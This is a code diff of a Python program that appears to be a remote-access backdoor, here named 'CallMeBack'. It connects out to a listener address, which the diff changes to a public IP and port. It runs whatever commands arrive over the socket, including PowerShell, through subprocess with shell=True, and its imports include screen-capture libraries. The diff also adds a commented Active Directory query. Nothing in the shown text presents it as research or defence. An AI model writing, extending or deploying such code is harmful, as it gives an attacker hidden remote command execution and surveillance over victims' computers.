@@ -7,16 +7,13 @@ import base64
 import requests
 from PIL import ImageGrab
 import sys
-import logging
 import threading
 import cv2
 import numpy as np
-from flask import Flask, Response
-from flask_socketio import SocketIO, emit
 import pyautogui
 import timeit,time
-LHOST = '10.195.100.240' # add ip address listner
-LPORT = int(7777) # add port
+LHOST ='3.67.161.133' # add ip address listner
+LPORT = int(18164) # add port
 hostname = socket.gethostname()
 IPaddress = socket.gethostbyname(hostname)
 Port = int(6655)
@@ -46,7 +43,7 @@ class CallMeBack:
         finally:
             pass       
     def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
-       
+       #Get-ADUser -Identity test -Properties *
         global Stopthread       
         SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.SendBack = SendBack
@@ -62,7 +59,7 @@ class CallMeBack:
                 subprocess.call('SendBack.close()',shell=True,stderr=subprocess.PIPE) 
             try:
                 if 'powershell' in data:
-                    Data = subprocess.run(["powershell.exe",data.split()[1] ], shell=True, capture_output=True)
+                    Data = subprocess.run(["powershell.exe"," ".join(data.split()[1:])], shell=True, capture_output=True)
                 else:
                     Data = subprocess.run(data,shell=True,capture_output=True)
                 
